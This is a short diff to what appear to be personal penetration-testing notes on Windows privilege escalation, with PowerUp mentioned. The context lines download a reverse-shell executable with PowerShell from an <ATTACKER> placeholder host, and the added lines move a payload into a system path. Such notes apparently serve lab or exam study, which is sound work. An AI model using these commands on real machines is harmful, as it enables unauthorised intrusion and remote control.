@@ -14,6 +14,9 @@ python3 -m http.server 80
 upload it
 iwr -uri http://<ATTACKER>/reverse.exe -Outfile rev.exe
 
+Move in payload
+Move-Item –Path Current.exe -Destination  "C:\<PATH>"
+
 ========================================================================================
 Powerup
 Upload it
